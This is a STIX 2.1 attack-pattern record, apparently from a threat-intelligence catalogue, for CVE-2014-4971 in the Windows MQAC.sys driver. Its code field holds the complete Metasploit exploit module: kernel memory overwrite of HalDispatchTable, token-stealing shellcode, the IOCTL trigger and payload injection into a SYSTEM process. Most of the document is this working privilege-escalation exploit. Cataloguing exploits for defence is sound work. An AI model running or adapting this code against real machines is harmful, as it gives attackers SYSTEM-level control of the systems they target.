{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--929348e9-3f4c-401d-bc9c-f86305525328",
    "created": "2024-08-14T16:49:10.698444Z",
    "modified": "2024-08-14T16:49:10.698448Z",
    "name": "MQAC.sys Arbitrary Write Privilege Escalation",
    "description": " A vulnerability within the MQAC.sys module allows an attacker to overwrite an arbitrary location in kernel memory.  This module will elevate itself to SYSTEM, then inject the payload into another SYSTEM process.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/local/mqac_write.rb",
            "external_id": "mqac_write.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-4971"
        },
        {
            "source_name": "reference",
            "url": "https://www.korelogic.com/Resources/Advisories/KL-001-2014-003.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = AverageRanking\n\n  include Msf::Exploit::Local::WindowsKernel\n  include Msf::Post::Windows::Priv\n  include Msf::Post::Windows::Process\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'MQAC.sys Arbitrary Write Privilege Escalation',\n        'Description' => %q{\n          A vulnerability within the MQAC.sys module allows an attacker to\n          overwrite an arbitrary location in kernel memory.\n\n          This module will elevate itself to SYSTEM, then inject the payload\n          into another SYSTEM process.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Matt Bergin', # original exploit and all the hard work\n          'Spencer McIntyre' # MSF module\n        ],\n        'Arch' => [ARCH_X86],\n        'Platform' => ['win'],\n        'SessionTypes' => ['meterpreter'],\n        'DefaultOptions' => {\n          'EXITFUNC' => 'thread'\n        },\n        'Targets' => [\n          [\n            'Windows XP SP3',\n            {\n              'HaliQuerySystemInfo' => 0x16bba,\n              '_KPROCESS' => \"\\x44\",\n              '_TOKEN' => \"\\xc8\",\n              '_UPID' => \"\\x84\",\n              '_APLINKS' => \"\\x88\"\n            }\n          ]\n        ],\n        'References' => [\n          ['CVE', '2014-4971'],\n          ['EDB', '34112'],\n          ['URL', 'https://www.korelogic.com/Resources/Advisories/KL-001-2014-003.txt']\n        ],\n        'DisclosureDate' => '2014-07-22',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [ CRASH_OS_RESTARTS, ]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_railgun_api\n              stdapi_sys_process_attach\n              stdapi_sys_process_getpid\n              stdapi_sys_process_memory_write\n            ]\n          }\n        }\n      )\n    )\n  end\n\n  # Function borrowed from smart_hashdump\n  def get_system_proc\n    # Make sure you got the correct SYSTEM Account Name no matter the OS Language\n    local_sys = resolve_sid('S-1-5-18')\n    system_account_name = \"#{local_sys[:domain]}\\\\#{local_sys[:name]}\"\n\n    this_pid = session.sys.process.getpid\n    # Processes that can Blue Screen a host if migrated in to\n    dangerous_processes = ['lsass.exe', 'csrss.exe', 'smss.exe']\n    session.sys.process.processes.each do |p|\n      # Check we are not migrating to a process that can BSOD the host\n      next if dangerous_processes.include?(p['name'])\n      next if p['pid'] == this_pid\n      next if p['pid'] == 4\n      next if p['user'] != system_account_name\n\n      return p\n    end\n  end\n\n  def check\n    handle = open_device('\\\\\\\\.\\\\MQAC', 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    if handle.nil?\n      print_error('MSMQ installation not found')\n      return Exploit::CheckCode::Safe\n    end\n    session.railgun.kernel32.CloseHandle(handle)\n\n    version = get_version_info\n    if version.build_number == Msf::WindowsVersion::XP_SP3\n      return Exploit::CheckCode::Appears\n    elsif version.xp_or_2003? && !version.windows_server?\n      vprint_error('Unsupported version of Windows XP detected')\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def exploit\n    if sysinfo['Architecture'] == ARCH_X64\n      fail_with(Failure::NoTarget, 'Running against 64-bit systems is not supported')\n    end\n\n    if is_system?\n      print_error('This meterpreter session is already running as SYSTEM')\n      return\n    end\n\n    # Running on Windows XP versions that aren't listed in the supported list\n    # results in a BSOD and so we should not let that happen.\n    if check == Exploit::CheckCode::Safe\n      fail_with(Failure::NotVulnerable, 'Exploit not available on this system')\n    end\n\n    base_addr = 0xffff\n    handle = open_device('\\\\\\\\.\\\\MQAC', 'FILE_SHARE_WRITE|FILE_SHARE_READ', 0, 'OPEN_EXISTING')\n    return if handle.nil?\n\n    this_proc = session.sys.process.open\n    unless this_proc.memory.writable?(base_addr)\n      session.railgun.ntdll.NtAllocateVirtualMemory(-1, [1].pack('V'), nil,\n                                                    [0xffff].pack('V'),\n                                                    'MEM_COMMIT|MEM_RESERVE',\n                                                    'PAGE_EXECUTE_READWRITE')\n    end\n    unless this_proc.memory.writable?(base_addr)\n      print_error('Failed to properly allocate memory')\n      this_proc.close\n      return\n    end\n\n    haldispatchtable = find_haldispatchtable\n    return if haldispatchtable.nil?\n\n    print_status(\"HalDisPatchTable Address: 0x#{haldispatchtable.to_s(16)}\")\n\n    vprint_status('Getting the hal.dll base address...')\n    hal_info = find_sys_base('hal.dll')\n    fail_with(Failure::Unknown, 'Failed to disclose hal.dll base address') if hal_info.nil?\n    hal_base = hal_info[0]\n    vprint_good(\"hal.dll base address disclosed at 0x#{hal_base.to_s(16).rjust(8, '0')}\")\n    hali_query_system_information = hal_base + target['HaliQuerySystemInfo']\n\n    restore_ptrs = \"\\x31\\xc0\" # xor eax, eax\n    restore_ptrs << \"\\xb8\" + [hali_query_system_information].pack('V') # mov eax, offset hal!HaliQuerySystemInformation\n    restore_ptrs << \"\\xa3\" + [haldispatchtable + 4].pack('V')          # mov dword ptr [nt!HalDispatchTable+0x4], eax\n\n    shellcode = make_nops(0x200) + restore_ptrs + token_stealing_shellcode(target)\n\n    this_proc.memory.write(0x1, shellcode)\n    this_proc.close\n\n    print_status('Triggering vulnerable IOCTL')\n    session.railgun.ntdll.NtDeviceIoControlFile(handle, 0, 0, 0, 4, 0x1965020f,\n                                                1, 0x258,\n                                                haldispatchtable + 4, 0)\n    session.railgun.ntdll.NtQueryIntervalProfile(1337, 4)\n\n    unless is_system?\n      print_error('Did not get system, exploit failed')\n      return\n    end\n\n    proc = get_system_proc\n    print_status(\"Injecting the payload into SYSTEM process: #{proc['name']}\")\n    unless execute_shellcode(payload.encoded, nil, proc['pid'])\n      fail_with(Failure::Unknown, 'Error while executing the payload')\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-07-22",
    "x_mitre_platforms": [
        "['win']"
    ]
}